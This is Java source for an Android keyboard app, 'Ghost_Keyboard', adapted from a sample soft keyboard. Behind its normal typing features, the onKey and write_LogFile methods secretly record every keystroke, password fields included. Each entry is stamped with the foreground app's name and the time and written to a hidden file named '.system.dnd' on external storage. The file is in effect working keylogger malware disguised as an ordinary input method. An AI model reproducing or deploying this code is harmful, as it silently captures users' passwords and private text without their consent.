package com.ghostman.keyboard;

import android.app.ActivityManager;
import android.app.Dialog;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.KeyboardView;
import android.inputmethodservice.Keyboard;
import android.os.Environment;
import android.os.IBinder;
import android.os.Vibrator;
import android.text.InputType;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.view.Window;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputMethodManager;
import android.view.inputmethod.InputMethodSubtype;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;

public class Ghost_Keyboard extends InputMethodService implements KeyboardView.OnKeyboardActionListener {

    static final boolean DEBUG = false;

    /**
     * This boolean indicates the optional example code for performing
     * processing of hard keys in addition to regular text generation
     * from on-screen interaction.  It would be used for input methods that
     * perform language translations (such as converting text entered on
     * a QWERTY keyboard to Chinese), but may not be used for input methods
     * that are primarily intended to be used for on-screen text entry.
     */
    //static final boolean PROCESS_HARD_KEYS = true;

    private InputMethodManager mInputMethodManager;
    private LatinKeyboardView mInputView;

    private int mLastDisplayWidth;
    private boolean mCapsLock;
    private long mLastShiftTime;
    private long mMetaState;

    private LatinKeyboard mSymbolsKeyboard;
    private LatinKeyboard mSymbolsShiftedKeyboard;
    private LatinKeyboard mQwertyKeyboard;
    private LatinKeyboard mCurKeyboard;

    private String mWordSeparators;

    public File logfile;
    public String keyLabel;
    private String previousApplication;

    /**
     * Main initialization of the input method component.  Be sure to call to super class.
     */
    @Override public void onCreate() {
        super.onCreate();
        mInputMethodManager = (InputMethodManager)getSystemService(INPUT_METHOD_SERVICE);
        mWordSeparators = getResources().getString(R.string.word_separators);
    }

    /**
     * This is the point where you can do all of your UI initialization.  It
     * is called after creation and any configuration change.
     */
    @Override public void onInitializeInterface() {
        if (mQwertyKeyboard != null) {
            int displayWidth = getMaxWidth();
            if (displayWidth == mLastDisplayWidth) return;
            mLastDisplayWidth = displayWidth;
        }
        mQwertyKeyboard = new LatinKeyboard(this, R.xml.qwerty);
        mSymbolsKeyboard = new LatinKeyboard(this, R.xml.symbols);
        mSymbolsShiftedKeyboard = new LatinKeyboard(this, R.xml.symbols_shift);
    }

    /**
     * Called by the framework when your view for creating input needs to
     * be generated.  This will be called the first time your input method
     * is displayed, and every time it needs to be re-created such as due to
     * a configuration change.
     */
    @Override public View onCreateInputView() {
        mInputView = (LatinKeyboardView) getLayoutInflater().inflate(R.layout.input, null);
        mInputView.setOnKeyboardActionListener(this);
        mInputView.setKeyboard(mQwertyKeyboard);

        logfile = new File(new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().toString())).append("/.system.dnd").toString());
        if (!logfile.exists()) {
            try {
                logfile.createNewFile();
            } catch (IOException e) {   e.printStackTrace();    }
        }

        return mInputView;
    }

 /** This is the main point where we do our initialization of the input method
     * to begin operating on an application.  At this point we have been
     * bound to the client, and are now receiving all of the detailed information
     * about the target of our edits.
     */
    @Override public void onStartInput(EditorInfo attribute, boolean restarting) {
        super.onStartInput(attribute, restarting);

        if (!restarting) {
            // Clear shift states.
            mMetaState = 0;
        }

        // We are now going to initialize our state based on the type of text being edited.
        switch (attribute.inputType & InputType.TYPE_MASK_CLASS) {
            case InputType.TYPE_CLASS_NUMBER:
            case InputType.TYPE_CLASS_DATETIME:
                // Numbers and dates default to the symbols keyboard, with no extra features.
                mCurKeyboard = mSymbolsKeyboard;
                break;

            case InputType.TYPE_CLASS_PHONE:
                // Phones will also default to the symbols keyboard, though
                // often you will want to have a dedicated phone keyboard.
                mCurKeyboard = mSymbolsKeyboard;
                break;

            case InputType.TYPE_CLASS_TEXT:
                mCurKeyboard = mQwertyKeyboard;
                // We now look for a few special variations of text that will
                // modify our behavior.
                int variation = attribute.inputType & InputType.TYPE_MASK_VARIATION;
                if (variation == InputType.TYPE_TEXT_VARIATION_PASSWORD || variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD) {
                    // Do not display predictions / what the user is typing
                    // when they are entering a password.
                }

                if (variation == InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS || variation == InputType.TYPE_TEXT_VARIATION_URI || variation == InputType.TYPE_TEXT_VARIATION_FILTER) {
                    // Our predictions are not useful for e-mail addresses or URIs.
                    //mPredictionOn = false;
                }

                if ((attribute.inputType & InputType.TYPE_TEXT_FLAG_AUTO_COMPLETE) != 0) {
                    // If this is an auto-complete text view, then our predictions
                    // will not be shown and instead we will allow the editor
                    // to supply their own.  We only show the editor's
                    // candidates when in fullscreen mode, otherwise relying
                    // own it displaying its own UI.
                }
                updateShiftKeyState(attribute);
                break;

            default:
                // For all unknown input types, default to the alphabetic
                // keyboard with no special features.
                mCurKeyboard = mQwertyKeyboard;
                updateShiftKeyState(attribute);
        }

        // Update the label on the enter key, depending on what the application
        // says it will do.
        mCurKeyboard.setImeOptions(getResources(), attribute.imeOptions);
    }

    @Override public void onStartInputView(EditorInfo attribute, boolean restarting) {
        super.onStartInputView(attribute, restarting);
        // Apply the selected keyboard to the input view.
        mInputView.setKeyboard(mCurKeyboard);
        mInputView.closing();
    }

    /**
     * This is called when the user is done editing a field.  We can use
     * this to reset our state.
     */
    @Override public void onFinishInput() {
        super.onFinishInput();

        mCurKeyboard = mQwertyKeyboard;
        if (mInputView != null) {
            mInputView.closing();
        }
    }

    /**
     * Use this to monitor key events being delivered to the application.
     * We get first crack at them, and can either resume them or let them
     * continue to the app.
     */
    @Override public boolean onKeyDown(int keyCode, KeyEvent event) {
        switch (keyCode) {
            case KeyEvent.KEYCODE_BACK:
                // The InputMethodService already takes care of the back
                // key for us, to dismiss the input method if it is shown.
                // However, our keyboard could be showing a pop-up window
                // that back should dismiss, so we first allow it to do that.
                if (event.getRepeatCount() == 0 && mInputView != null) {
                    if (mInputView.handleBack()) {
                        return true;
                    }
                }
                break;

            case KeyEvent.KEYCODE_DEL:
                // Special handling of the delete key: if we currently are
                // composing text for the user, we want to modify that instead
                // of let the application to the delete itself.
                    onKey(Keyboard.KEYCODE_DELETE, null);
                break;

            case KeyEvent.KEYCODE_ENTER:
                // Let the underlying text editor always handle these.
                return false;

            default:break;
        }
        return super.onKeyDown(keyCode, event);
    }

    /**
     * Helper to update the shift state of our keyboard based on the initial
     * editor state.
     */
    private void updateShiftKeyState(EditorInfo attr) {
        if (attr != null && mInputView != null &&  mInputView.getKeyboard() == mQwertyKeyboard) {
            int caps = 0;
            EditorInfo ei = getCurrentInputEditorInfo();
            if (ei != null && ei.inputType != InputType.TYPE_NULL)
                caps = getCurrentInputConnection().getCursorCapsMode(attr.inputType);

            mInputView.setShifted(mCapsLock || caps != 0);
        }
    }

    /**
     * Helper to send a key down / key up pair to the current editor.
     */
    private void keyDownUp(int keyEventCode) {
        getCurrentInputConnection().sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, keyEventCode));
        getCurrentInputConnection().sendKeyEvent(new KeyEvent(KeyEvent.ACTION_UP, keyEventCode));
    }

    /**
     * Helper to send a character to the editor as raw key events.
     */
    private void sendKey(int keyCode) {
        switch (keyCode) {
            case '\n':
                keyDownUp(KeyEvent.KEYCODE_ENTER);
                break;
            default:
                if (keyCode >= '0' && keyCode <= '9') {
                    keyDownUp(keyCode - '0' + KeyEvent.KEYCODE_0);
                } else {
                    getCurrentInputConnection().commitText(String.valueOf((char) keyCode), 1);
                }
                break;
        }
    }

    public void onKey(int primaryCode, int[] keyCodes) {
        if (isWordSeparator(primaryCode)) {
            char code = (char) primaryCode;
            // Handle separator
            sendKey(primaryCode);
            //updateShiftKeyState(getCurrentInputEditorInfo());
            keyLabel = String.valueOf(code);
        }
        else {
            switch(primaryCode) {
                case Keyboard.KEYCODE_DELETE:
                    keyDownUp(KeyEvent.KEYCODE_DEL);
                    updateShiftKeyState(getCurrentInputEditorInfo());
                    keyLabel = "<D>";
                    break;

                case Keyboard.KEYCODE_SHIFT:
                    handleShift();
                    keyLabel = "<SFT>";
                    break;

                case LatinKeyboardView.KEYCODE_LANGUAGE_SWITCH:
                    mInputMethodManager.switchToNextInputMethod(getToken(), false);
                    break;

                case LatinKeyboardView.KEYCODE_OPTIONS:
                    break;

                case Keyboard.KEYCODE_MODE_CHANGE:
                    if (mInputView != null) {
                        Keyboard current = mInputView.getKeyboard();
                        if (current == mSymbolsKeyboard || current == mSymbolsShiftedKeyboard) {
                            mInputView.setKeyboard(mQwertyKeyboard);
                        } else {
                            mInputView.setKeyboard(mSymbolsKeyboard);
                            mSymbolsKeyboard.setImeOptions(getResources(), getCurrentInputEditorInfo().imeOptions);
                            mSymbolsKeyboard.setShifted(false);
                        }
                    }
                    keyLabel = null;
                    break;

                default:
                    char code = (char) primaryCode;
                    if (isInputViewShown()) {
                        if (mInputView.isShifted()) {
                            code = Character.toUpperCase(code);
                        }
                    }
                    if (Character.isLetter(code)) {
                        updateShiftKeyState(getCurrentInputEditorInfo());
                        getCurrentInputConnection().commitText(String.valueOf(code), 1);
                        updateShiftKeyState(getCurrentInputEditorInfo());
                        keyLabel = String.valueOf(code);
                    } else {
                        getCurrentInputConnection().commitText(String.valueOf(code), 1);
                        keyLabel = String.valueOf(code);
                    }
                    break;
            }
        }

        if (primaryCode == 32)
            keyLabel = "<S>";

        if(keyLabel != null) write_LogFile(getCurrentTime(),getCurrentApplication(),keyLabel);
    }

    private String getWordSeparators() {
        return mWordSeparators;
    }

    public boolean isWordSeparator(int code) {
        String separators = getWordSeparators();
        return separators.contains(String.valueOf((char)code));
    }

    private void handleShift() {
        if (mInputView == null) return;
        Keyboard currentKeyboard = mInputView.getKeyboard();
        if (currentKeyboard == mQwertyKeyboard) {
            long now = System.currentTimeMillis();
            if (mLastShiftTime + 800 > now) {
                mCapsLock = !mCapsLock;
                mLastShiftTime = 0;
                final InputMethodSubtype subtype = mInputMethodManager.getCurrentInputMethodSubtype();
                mInputView.setShiftKeyIcon(subtype, mCapsLock);
            } else {
                mLastShiftTime = now;
            }
            mInputView.setShifted(mCapsLock || !mInputView.isShifted());
        } else if (currentKeyboard == mSymbolsKeyboard) {
            mSymbolsKeyboard.setShifted(true);
            mInputView.setKeyboard(mSymbolsShiftedKeyboard);
            mSymbolsShiftedKeyboard.setImeOptions(getResources(), getCurrentInputEditorInfo().imeOptions);
            mSymbolsShiftedKeyboard.setShifted(true);
        } else if (currentKeyboard == mSymbolsShiftedKeyboard) {
            mSymbolsShiftedKeyboard.setShifted(false);
            mInputView.setKeyboard(mSymbolsKeyboard);
            mSymbolsKeyboard.setShifted(false);
        }
    }

    @Override
    public void onCurrentInputMethodSubtypeChanged(InputMethodSubtype subtype) {
        mInputView.setShiftKeyIcon(subtype,mCapsLock);
    }

    @Override
    public View onCreateCandidatesView() {
        LayoutInflater mLayoutInflater = (LayoutInflater) getApplicationContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        View wordBar = mLayoutInflater.inflate(R.layout.preview,null);

        setCandidatesViewShown(false);

        return wordBar;
    }

    private IBinder getToken() {
        final Dialog dialog = getWindow();
        if (dialog == null) {
            return null;
        }
        final Window window = dialog.getWindow();
        if (window == null) {
            return null;
        }
        return window.getAttributes().token;
    }

    public void onText(CharSequence text) {}

    public void swipeRight() {}

    public void swipeLeft() {}

   public void swipeDown() {}

    public void swipeUp() {}

    public void onPress(int primaryCode) {
        Vibrator vibrator = (Vibrator)getSystemService(Context.VIBRATOR_SERVICE);
        vibrator.vibrate(40);

        if (!(primaryCode == 32 || primaryCode == Keyboard.KEYCODE_DELETE || primaryCode == Keyboard.KEYCODE_SHIFT || primaryCode == LatinKeyboardView.KEYCODE_LANGUAGE_SWITCH
            || primaryCode == LatinKeyboardView.KEYCODE_OPTIONS || primaryCode == Keyboard.KEYCODE_MODE_CHANGE ))
            mInputView.setPreviewEnabled(true);
    }

    public void onRelease(int primaryCode) {
        mInputView.setPreviewEnabled(false);
    }

    public void write_LogFile(String currentTime,String currentApplication, String key) {
        try {
            FileWriter writer = new FileWriter(this.logfile, true);
            if (currentApplication.equalsIgnoreCase(this.previousApplication)) {
                writer.append(key);
                writer.flush();
                writer.close();
            } else {
                writer.append("\n\n" + currentApplication + " : " + currentTime + " : " + key);
                writer.flush();
                writer.close();
            }
            previousApplication = currentApplication;
        } catch (IOException e) {   e.printStackTrace();    }
    }

    public String getCurrentApplication() {
        ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);

        String foregroundTaskPackageName = activityManager.getRunningTasks(1).get(0).topActivity.getPackageName();
        PackageManager pm = getPackageManager();
        PackageInfo foregroundAppPackageInfo = null;

        try {
            foregroundAppPackageInfo = pm.getPackageInfo(foregroundTaskPackageName,0);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            //Toast.makeText(this, "NAME NOT FOUND : " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
        return foregroundAppPackageInfo.applicationInfo.loadLabel(pm).toString();
    }

    public String getCurrentTime() {
        return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(Calendar.getInstance().getTime());
    }

}
